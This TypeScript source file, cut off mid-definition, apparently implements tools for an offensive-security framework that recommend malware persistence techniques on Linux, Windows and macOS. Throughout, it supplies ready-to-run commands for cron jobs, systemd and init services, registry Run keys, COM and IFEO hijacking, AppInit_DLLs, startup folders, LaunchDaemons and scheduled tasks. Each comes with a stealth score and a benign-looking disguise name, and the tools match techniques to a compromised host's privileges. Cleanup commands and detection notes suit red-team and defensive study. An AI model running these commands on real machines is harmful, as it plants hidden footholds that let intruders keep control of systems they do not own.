import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

interface PersistenceTechnique {
  technique: string;
  description: string;
  platform: Platform;
  binary: string;
  command: string;
  cleanup_command: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
}

// ── persist_cron ──────────────────────────────────────────────────────────────

const persist_cron: ToolDef = {
  name: "persist_cron",
  description:
    "Find cron-based persistence techniques on Linux, including writable cron paths and at-job abuse",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux"])
      .default("linux")
      .describe("Target platform (cron is Linux-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "linux";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    // Search KB for persistence-related entries on Linux
    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbCron = ctx.knowledgeBase.searchByKeyword("cron", platform);
    const kbAt = ctx.knowledgeBase.searchByKeyword("at ", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbCron, ...kbAt])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "User Crontab Entry",
        description: "Add a reverse shell or payload to the current user's crontab via crontab -e",
        platform,
        binary: "crontab",
        command: '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.payload") | crontab -',
        cleanup_command: 'crontab -l | grep -v "/tmp/.payload" | crontab -',
        stealth_score: 3,
        attck_ids: ["T1053.003"],
        prerequisites: ["User-level access"],
        detection_notes: "Crontab changes logged in /var/log/syslog or /var/log/cron. Auditd can monitor crontab(1).",
      },
      {
        technique: "System Cron Directory Drop",
        description: "Drop a script into /etc/cron.d/, /etc/cron.daily/, or /etc/cron.hourly/",
        platform,
        binary: "cp",
        command: 'echo "#!/bin/bash\n/tmp/.payload" > /etc/cron.daily/.updater && chmod +x /etc/cron.daily/.updater',
        cleanup_command: "rm -f /etc/cron.daily/.updater",
        stealth_score: 2,
        attck_ids: ["T1053.003"],
        prerequisites: ["Root or write access to /etc/cron.d/ or /etc/cron.daily/"],
        detection_notes: "File integrity monitoring on /etc/cron.* directories. Inotify watches.",
      },
      {
        technique: "Cron PATH Hijack",
        description: "Exploit cron's PATH variable by placing a binary with the same name as a cron command in a writable PATH directory",
        platform,
        binary: "bash",
        command: 'echo "#!/bin/bash\n/tmp/.payload" > /writable/path/target_binary && chmod +x /writable/path/target_binary',
        cleanup_command: "rm -f /writable/path/target_binary",
        stealth_score: 2,
        attck_ids: ["T1053.003", "T1574.007"],
        prerequisites: ["Writable directory in cron PATH, cron job referencing a relative binary"],
        detection_notes: "Monitor cron PATH directories for new executables. Hash validation.",
      },
      {
        technique: "Writable Cron Script Modification",
        description: "Modify an existing cron-executed script that has world-writable or group-writable permissions",
        platform,
        binary: "bash",
        command: 'echo "/tmp/.payload &" >> /path/to/writable/cron_script.sh',
        cleanup_command: "Edit /path/to/writable/cron_script.sh and remove the injected line",
        stealth_score: 1,
        attck_ids: ["T1053.003"],
        prerequisites: ["Write access to a script executed by cron"],
        detection_notes: "File integrity monitoring. Auditd watch on cron-executed scripts.",
      },
      {
        technique: "at Job Scheduling",
        description: "Use the at command to schedule a one-time or recurring command execution",
        platform,
        binary: "at",
        command: 'echo "/tmp/.payload" | at now + 1 minute',
        cleanup_command: "atrm <job_id>",
        stealth_score: 3,
        attck_ids: ["T1053.001"],
        prerequisites: ["at command available, user not in /etc/at.deny"],
        detection_notes: "at jobs stored in /var/spool/at/ or /var/spool/cron/atjobs. Monitor atd logs.",
      },
      {
        technique: "Anacron Persistence",
        description: "Add persistence via anacron which runs missed cron jobs after system boot",
        platform,
        binary: "anacron",
        command: 'echo "1 5 persistence.job /tmp/.payload" >> /etc/anacrontab',
        cleanup_command: 'sed -i "/persistence\\.job/d" /etc/anacrontab',
        stealth_score: 2,
        attck_ids: ["T1053.003"],
        prerequisites: ["Root access, anacron installed"],
        detection_notes: "Monitor /etc/anacrontab for modifications.",
      },
    ];

    // Contextualize with session data if available
    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const writableCronPaths = session.state.writablePaths.filter(
        p => p.includes("cron") || p.includes("/var/spool") || p.includes("/etc/cron"),
      );
      const existingCronJobs = session.state.cronJobs;
      const writableCronJobs = existingCronJobs.filter(j => j.writable);

      sessionContext = {
        environment_id: session.id,
        writable_cron_paths: writableCronPaths,
        existing_cron_jobs: existingCronJobs.length,
        writable_cron_jobs: writableCronJobs.map(j => ({
          path: j.path,
          command: j.command,
          user: j.user,
          schedule: j.schedule,
        })),
        recommendations: writableCronJobs.length > 0
          ? `Found ${writableCronJobs.length} writable cron job(s) — "Writable Cron Script Modification" is directly applicable.`
          : writableCronPaths.length > 0
            ? `Found ${writableCronPaths.length} writable cron path(s) — "System Cron Directory Drop" or "Cron PATH Hijack" may be applicable.`
            : "No writable cron paths found. User crontab or at jobs may still be viable.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── persist_service ───────────────────────────────────────────────────────────

const persist_service: ToolDef = {
  name: "persist_service",
  description:
    "Find service-based persistence techniques on Linux using systemd unit files and init scripts",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["linux"])
      .default("linux")
      .describe("Target platform (systemd/init is Linux-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "linux";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbService = ctx.knowledgeBase.searchByKeyword("service", platform);
    const kbSystemd = ctx.knowledgeBase.searchByKeyword("systemd", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbService, ...kbSystemd])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "Systemd User Unit",
        description: "Create a user-level systemd service that starts on login via ~/.config/systemd/user/",
        platform,
        binary: "systemctl",
        command: `mkdir -p ~/.config/systemd/user/ && cat > ~/.config/systemd/user/updater.service << 'EOF'
[Unit]
Description=System Updater
[Service]
ExecStart=/tmp/.payload
Restart=always
RestartSec=60
[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload && systemctl --user enable --now updater.service`,
        cleanup_command: "systemctl --user disable --now updater.service && rm ~/.config/systemd/user/updater.service",
        stealth_score: 2,
        attck_ids: ["T1543.002"],
        prerequisites: ["User-level access, systemd user session"],
        detection_notes: "Monitor ~/.config/systemd/user/ for new .service files. Journalctl logging.",
      },
      {
        technique: "Systemd System Unit",
        description: "Create a system-level systemd service unit in /etc/systemd/system/",
        platform,
        binary: "systemctl",
        command: `cat > /etc/systemd/system/updater.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target
[Service]
Type=simple
ExecStart=/opt/.updater
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now updater.service`,
        cleanup_command: "systemctl disable --now updater.service && rm /etc/systemd/system/updater.service && systemctl daemon-reload",
        stealth_score: 2,
        attck_ids: ["T1543.002"],
        prerequisites: ["Root access"],
        detection_notes: "Monitor /etc/systemd/system/ for new units. Auditd on systemctl enable.",
      },
      {
        technique: "Systemd Timer Persistence",
        description: "Create a systemd timer that periodically triggers a service unit",
        platform,
        binary: "systemctl",
        command: `cat > /etc/systemd/system/cleanup.timer << 'EOF'
[Unit]
Description=Periodic Cleanup
[Timer]
OnCalendar=*:0/15
Persistent=true
[Install]
WantedBy=timers.target
EOF
systemctl daemon-reload && systemctl enable --now cleanup.timer`,
        cleanup_command: "systemctl disable --now cleanup.timer && rm /etc/systemd/system/cleanup.timer /etc/systemd/system/cleanup.service",
        stealth_score: 2,
        attck_ids: ["T1053.006"],
        prerequisites: ["Root access"],
        detection_notes: "Monitor systemd timer units. systemctl list-timers shows all active timers.",
      },
      {
        technique: "SysVinit Script",
        description: "Place a SysVinit startup script in /etc/init.d/ for legacy init systems",
        platform,
        binary: "update-rc.d",
        command: `cat > /etc/init.d/updater << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          updater
# Required-Start:    $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
### END INIT INFO
case "$1" in start) /opt/.updater & ;; esac
EOF
chmod +x /etc/init.d/updater && update-rc.d updater defaults`,
        cleanup_command: "update-rc.d updater remove && rm /etc/init.d/updater",
        stealth_score: 3,
        attck_ids: ["T1037.004"],
        prerequisites: ["Root access, SysVinit or compatibility layer"],
        detection_notes: "Monitor /etc/init.d/ for new scripts. chkconfig --list.",
      },
      {
        technique: "rc.local Execution",
        description: "Append commands to /etc/rc.local which runs at the end of boot",
        platform,
        binary: "bash",
        command: 'echo "/opt/.updater &" >> /etc/rc.local && chmod +x /etc/rc.local',
        cleanup_command: 'Edit /etc/rc.local and remove the injected line',
        stealth_score: 3,
        attck_ids: ["T1037.004"],
        prerequisites: ["Root access, rc.local enabled"],
        detection_notes: "Monitor /etc/rc.local for modifications. File integrity monitoring.",
      },
      {
        technique: "D-Bus Service Hijack",
        description: "Register a malicious D-Bus service that is activated on demand",
        platform,
        binary: "dbus-daemon",
        command: `cat > /usr/share/dbus-1/system-services/org.updater.service << 'EOF'
[D-BUS Service]
Name=org.updater
Exec=/opt/.updater
User=root
EOF`,
        cleanup_command: "rm /usr/share/dbus-1/system-services/org.updater.service",
        stealth_score: 1,
        attck_ids: ["T1543.002"],
        prerequisites: ["Root access, D-Bus system bus"],
        detection_notes: "Monitor D-Bus service directories. busctl list to enumerate services.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const writableServicePaths = session.state.writablePaths.filter(
        p => p.includes("systemd") || p.includes("init.d") || p.includes("rc.local"),
      );
      const runningServices = session.state.runningServices;

      sessionContext = {
        environment_id: session.id,
        writable_service_paths: writableServicePaths,
        running_services_count: runningServices.length,
        recommendations: writableServicePaths.length > 0
          ? `Found ${writableServicePaths.length} writable service path(s) — direct service unit creation is possible.`
          : "No writable service paths detected. User-level systemd units may still be viable.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── persist_registry ──────────────────────────────────────────────────────────

const persist_registry: ToolDef = {
  name: "persist_registry",
  description:
    "Find registry-based persistence techniques on Windows including Run keys, services, and COM hijacking",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (registry is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbRegistry = ctx.knowledgeBase.searchByKeyword("registry", platform);
    const kbRun = ctx.knowledgeBase.searchByKeyword("Run", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbRegistry, ...kbRun])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "HKCU Run Key",
        description: "Add a value to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for current-user persistence on login",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\Public\\updater.exe" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /f',
        stealth_score: 4,
        attck_ids: ["T1547.001"],
        prerequisites: ["User-level access"],
        detection_notes: "Sysmon Event ID 13 (RegistryEvent). Autoruns detection. Well-monitored by EDR.",
      },
      {
        technique: "HKLM Run Key",
        description: "Add a value to HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for all-user persistence",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\updater.exe" /f',
        cleanup_command: 'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /f',
        stealth_score: 4,
        attck_ids: ["T1547.001"],
        prerequisites: ["Administrator access"],
        detection_notes: "Sysmon Event ID 13. Heavily monitored. Autoruns detection.",
      },
      {
        technique: "RunOnce Key",
        description: "Add a RunOnce key that executes once on next login and self-deletes",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Update /t REG_SZ /d "C:\\Users\\Public\\payload.exe" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Update /f',
        stealth_score: 3,
        attck_ids: ["T1547.001"],
        prerequisites: ["User-level access"],
        detection_notes: "Sysmon Event ID 13. Key auto-deletes after execution making forensics harder.",
      },
      {
        technique: "Registry Service Creation",
        description: "Create a Windows service via registry to run a payload as SYSTEM",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Updater" /v ImagePath /t REG_EXPAND_SZ /d "C:\\Windows\\Temp\\svc.exe" /f && reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Updater" /v Start /t REG_DWORD /d 2 /f && reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Updater" /v Type /t REG_DWORD /d 16 /f',
        cleanup_command: 'sc delete Updater',
        stealth_score: 3,
        attck_ids: ["T1543.003"],
        prerequisites: ["Administrator access"],
        detection_notes: "Sysmon Event ID 13. Service creation events (7045). sc query monitoring.",
      },
      {
        technique: "COM Object Hijacking",
        description: "Hijack a COM object by overriding its InprocServer32 registry key to load a malicious DLL",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\evil.dll" /f && reg add "HKCU\\Software\\Classes\\CLSID\\{CLSID}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f',
        cleanup_command: 'reg delete "HKCU\\Software\\Classes\\CLSID\\{CLSID}" /f',
        stealth_score: 1,
        attck_ids: ["T1546.015"],
        prerequisites: ["User-level access, knowledge of target CLSID"],
        detection_notes: "Monitor HKCU\\Software\\Classes\\CLSID for new InprocServer32 entries.",
      },
      {
        technique: "Image File Execution Options (IFEO) Debugger",
        description: "Set a debugger for a legitimate binary via IFEO to redirect execution",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\Temp\\payload.exe" /f',
        cleanup_command: 'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /f',
        stealth_score: 2,
        attck_ids: ["T1546.012"],
        prerequisites: ["Administrator access"],
        detection_notes: "Monitor IFEO registry keys. Sysmon Event ID 13.",
      },
      {
        technique: "AppInit_DLLs",
        description: "Register a DLL to be loaded into every user-mode process via AppInit_DLLs registry key",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\Windows\\Temp\\hook.dll" /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f',
        cleanup_command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "" /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f',
        stealth_score: 3,
        attck_ids: ["T1546.010"],
        prerequisites: ["Administrator access, Secure Boot may block"],
        detection_notes: "Well-known persistence vector. EDR and Autoruns detect this.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const registryKeys = session.state.registryKeys;
      const runKeys = registryKeys.filter(k =>
        k.path.toLowerCase().includes("currentversion\\run"),
      );

      sessionContext = {
        environment_id: session.id,
        existing_run_keys: runKeys,
        privilege_level: session.state.privilegeLevel,
        recommendations: session.state.privilegeLevel === "admin" || session.state.privilegeLevel === "system"
          ? "Administrator access confirmed — HKLM Run keys, service creation, IFEO, and AppInit_DLLs are all viable."
          : "User-level access — HKCU Run keys, RunOnce, and COM hijacking are applicable without elevation.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── persist_startup ───────────────────────────────────────────────────────────

const persist_startup: ToolDef = {
  name: "persist_startup",
  description:
    "Find startup folder persistence techniques on Windows for user and all-users startup directories",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (startup folders are Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbStartup = ctx.knowledgeBase.searchByKeyword("startup", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbStartup])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "User Startup Folder",
        description: "Drop an executable or shortcut (.lnk) into the current user's Startup folder",
        platform,
        binary: "explorer.exe",
        command: 'copy C:\\Users\\Public\\payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"',
        cleanup_command: 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"',
        stealth_score: 4,
        attck_ids: ["T1547.001"],
        prerequisites: ["User-level access"],
        detection_notes: "Well-known vector. Autoruns, Sysmon file creation events, EDR monitoring.",
      },
      {
        technique: "All Users Startup Folder",
        description: "Drop a payload into the common Startup folder for all-user persistence",
        platform,
        binary: "explorer.exe",
        command: 'copy C:\\Users\\Public\\payload.exe "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"',
        cleanup_command: 'del "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"',
        stealth_score: 4,
        attck_ids: ["T1547.001"],
        prerequisites: ["Administrator access"],
        detection_notes: "Monitored by Autoruns, EDR, and endpoint hygiene checks.",
      },
      {
        technique: "LNK Shortcut in Startup",
        description: "Create a .lnk shortcut file in the Startup folder pointing to the payload",
        platform,
        binary: "powershell.exe",
        command: `$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk"); $s.TargetPath = "C:\\Users\\Public\\payload.exe"; $s.Save()`,
        cleanup_command: 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.lnk"',
        stealth_score: 3,
        attck_ids: ["T1547.001", "T1204.002"],
        prerequisites: ["User-level access, PowerShell available"],
        detection_notes: "Monitor Startup folder for .lnk creation. Sysmon Event ID 11.",
      },
      {
        technique: "Registry Startup Folder Override",
        description: "Change the Startup folder path in the registry to point to an attacker-controlled directory",
        platform,
        binary: "reg.exe",
        command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" /v Startup /t REG_EXPAND_SZ /d "C:\\Users\\Public\\CustomStartup" /f',
        cleanup_command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" /v Startup /t REG_EXPAND_SZ /d "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" /f',
        stealth_score: 1,
        attck_ids: ["T1547.001"],
        prerequisites: ["User-level access"],
        detection_notes: "Monitor registry changes to User Shell Folders\\Startup. Uncommon technique.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const writablePaths = session.state.writablePaths.filter(
        p => p.toLowerCase().includes("startup"),
      );

      sessionContext = {
        environment_id: session.id,
        writable_startup_paths: writablePaths,
        privilege_level: session.state.privilegeLevel,
        recommendations: writablePaths.length > 0
          ? `Found ${writablePaths.length} writable Startup path(s) — direct file drop is possible.`
          : "Startup folder writability not confirmed. User Startup folder is typically writable by default.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── persist_launchd ───────────────────────────────────────────────────────────

const persist_launchd: ToolDef = {
  name: "persist_launchd",
  description:
    "Find LaunchAgent and LaunchDaemon persistence techniques on macOS",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["macos"])
      .default("macos")
      .describe("Target platform (launchd is macOS-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "macos";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbLaunch = ctx.knowledgeBase.searchByKeyword("launch", platform);
    const kbPlist = ctx.knowledgeBase.searchByKeyword("plist", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbLaunch, ...kbPlist])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "User LaunchAgent",
        description: "Create a user-level LaunchAgent plist in ~/Library/LaunchAgents/ that executes on login",
        platform,
        binary: "launchctl",
        command: `cat > ~/Library/LaunchAgents/com.updater.agent.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.updater.agent</string>
  <key>ProgramArguments</key><array><string>/tmp/.payload</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.updater.agent.plist`,
        cleanup_command: "launchctl unload ~/Library/LaunchAgents/com.updater.agent.plist && rm ~/Library/LaunchAgents/com.updater.agent.plist",
        stealth_score: 3,
        attck_ids: ["T1543.001"],
        prerequisites: ["User-level access"],
        detection_notes: "Monitor ~/Library/LaunchAgents/ for new plists. KnockKnock, BlockBlock, and osquery detection.",
      },
      {
        technique: "System LaunchAgent",
        description: "Create a system-wide LaunchAgent in /Library/LaunchAgents/ that runs for all users",
        platform,
        binary: "launchctl",
        command: `sudo cp com.updater.agent.plist /Library/LaunchAgents/ && sudo launchctl load /Library/LaunchAgents/com.updater.agent.plist`,
        cleanup_command: "sudo launchctl unload /Library/LaunchAgents/com.updater.agent.plist && sudo rm /Library/LaunchAgents/com.updater.agent.plist",
        stealth_score: 2,
        attck_ids: ["T1543.001"],
        prerequisites: ["Root or sudo access"],
        detection_notes: "Monitor /Library/LaunchAgents/. System Integrity Protection may interfere.",
      },
      {
        technique: "LaunchDaemon",
        description: "Create a LaunchDaemon in /Library/LaunchDaemons/ for root-level persistence that runs at boot",
        platform,
        binary: "launchctl",
        command: `sudo cat > /Library/LaunchDaemons/com.updater.daemon.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>com.updater.daemon</string>
  <key>ProgramArguments</key><array><string>/usr/local/bin/.updater</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>UserName</key><string>root</string>
</dict>
</plist>
EOF
sudo launchctl load /Library/LaunchDaemons/com.updater.daemon.plist`,
        cleanup_command: "sudo launchctl unload /Library/LaunchDaemons/com.updater.daemon.plist && sudo rm /Library/LaunchDaemons/com.updater.daemon.plist",
        stealth_score: 2,
        attck_ids: ["T1543.001"],
        prerequisites: ["Root access"],
        detection_notes: "Monitor /Library/LaunchDaemons/. SIP-protected paths cannot be written.",
      },
      {
        technique: "Login Items via osascript",
        description: "Add a Login Item via AppleScript so the payload launches at user login",
        platform,
        binary: "osascript",
        command: `osascript -e 'tell application "System Events" to make login item at end with properties {path:"/tmp/.payload", hidden:true}'`,
        cleanup_command: `osascript -e 'tell application "System Events" to delete login item "payload"'`,
        stealth_score: 3,
        attck_ids: ["T1547.015"],
        prerequisites: ["User-level access, Accessibility permissions may be needed"],
        detection_notes: "Login Items visible in System Preferences. TCC database queries.",
      },
      {
        technique: "Periodic Scripts",
        description: "Place a script in /etc/periodic/daily/ (or weekly/monthly) for periodic execution",
        platform,
        binary: "bash",
        command: 'sudo sh -c \'echo "#!/bin/bash\n/tmp/.payload" > /etc/periodic/daily/500.updater && chmod +x /etc/periodic/daily/500.updater\'',
        cleanup_command: "sudo rm /etc/periodic/daily/500.updater",
        stealth_score: 1,
        attck_ids: ["T1053.003"],
        prerequisites: ["Root access"],
        detection_notes: "Monitor /etc/periodic/ directories. Less commonly monitored than LaunchAgents.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        existing_launch_agents: session.state.launchAgents,
        existing_launch_daemons: session.state.launchDaemons,
        sip_enabled: session.state.sipEnabled,
        gatekeeper_enabled: session.state.gatekeeperEnabled,
        recommendations: session.state.sipEnabled
          ? "SIP is enabled — /System/Library/ LaunchDaemons are protected. Use /Library/ or ~/Library/ paths."
          : "SIP is disabled — all LaunchAgent/LaunchDaemon paths are writable with appropriate privileges.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── persist_scheduled_task ────────────────────────────────────────────────────

const persist_scheduled_task: ToolDef = {
  name: "persist_scheduled_task",
  description:
    "Find scheduled task persistence techniques on Windows using schtasks and Task Scheduler",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (scheduled tasks are Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPersistence = ctx.knowledgeBase.searchByFunction("persistence", platform);
    const kbSchtasks = ctx.knowledgeBase.searchByKeyword("schtasks", platform);
    const kbScheduled = ctx.knowledgeBase.searchByKeyword("scheduled", platform);
    const kbEntries = deduplicateByBinary([...kbPersistence, ...kbSchtasks, ...kbScheduled])
      .filter(e => e.platform === platform);

    const techniques: PersistenceTechnique[] = [
      {
        technique: "Scheduled Task (User Context)",
        description: "Create a scheduled task that runs as the current user at logon or on a schedule",
        platform,
        binary: "schtasks.exe",
        command: 'schtasks /create /tn "\\Microsoft\\Windows\\Updater" /tr "C:\\Users\\Public\\payload.exe" /sc onlogon /ru "%USERNAME%" /f',
        cleanup_command: 'schtasks /delete /tn "\\Microsoft\\Windows\\Updater" /f',
        stealth_score: 3,
        attck_ids: ["T1053.005"],
        prerequisites: ["User-level access"],
        detection_notes: "Event ID 4698 (task created). Sysmon process creation. Autoruns detection.",
      },
      {
        technique: "Scheduled Task (SYSTEM Context)",
        description: "Create a scheduled task that runs as SYSTEM, providing highest privilege persistence",
        platform,
        binary: "schtasks.exe",
        command: 'schtasks /create /tn "\\Microsoft\\Windows\\SystemUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onstart /ru SYSTEM /f',
        cleanup_command: 'schtasks /delete /tn "\\Microsoft\\Windows\\SystemUpdate" /f',
        stealth_score: 3,
        attck_ids: ["T1053.005"],
        prerequisites: ["Administrator access"],
        detection_notes: "Event ID 4698. Tasks running as SYSTEM are highly suspicious.",
      },
      {
        technique: "Scheduled Task with Hidden XML",
        description: "Import a task from XML which allows finer control and can be harder to detect via command line logging",
        platform,
        binary: "schtasks.exe",
        command: 'schtasks /create /tn "\\Microsoft\\Windows\\NetTrace" /xml task.xml /f',
        cleanup_command: 'schtasks /delete /tn "\\Microsoft\\Windows\\NetTrace" /f',
        stealth_score: 2,
        attck_ids: ["T1053.005"],
        prerequisites: ["Task XML file crafted, appropriate privileges"],
        detection_notes: "XML import hides task details from command-line logging. Check TaskScheduler operational log.",
      },
      {
        technique: "Scheduled Task via COM (TaskScheduler API)",
        description: "Create a task programmatically via the ITaskService COM interface, bypassing schtasks.exe logging",
        platform,
        binary: "powershell.exe",
        command: `$action = New-ScheduledTaskAction -Execute "C:\\Users\\Public\\payload.exe"; $trigger = New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -RunLevel Highest`,
